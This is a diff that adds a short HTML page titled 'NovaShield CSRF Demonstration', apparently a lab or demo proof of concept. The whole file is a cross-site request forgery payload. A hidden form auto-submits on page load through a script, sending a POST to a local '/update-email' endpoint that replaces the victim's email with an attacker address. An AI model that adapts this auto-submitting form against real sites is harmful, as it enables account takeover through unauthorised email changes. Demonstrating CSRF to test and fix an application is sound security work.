@@ -1,0 +1,19 @@
+<!doctype html>
+<html>
+<body>
+<h2>NovaShield CSRF Demonstration</h2>
+
+<form id="attack"
+      action="http://127.0.0.1:5000/update-email"
+      method="POST">
+    <input type="hidden"
+           name="email"
+           value="hahah@hacked.com">
+</form>
+
+<script>
+document.getElementById("attack").submit();
+</script>
+
+</body>
+</html>
